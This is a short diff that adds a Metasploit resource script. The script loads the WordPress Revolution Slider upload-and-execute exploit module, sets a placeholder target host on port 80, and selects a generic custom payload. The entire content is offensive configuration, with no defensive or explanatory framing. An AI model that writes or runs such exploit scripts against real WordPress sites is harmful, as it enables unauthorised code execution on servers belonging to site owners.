@@ -1,0 +1,6 @@
+use exploit/unix/webapp/wp_revslider_upload_execute 
+set RHOST 0.0.0.0
+set RPORT 80 
+set PAYLOAD generic/custom
+
+ 
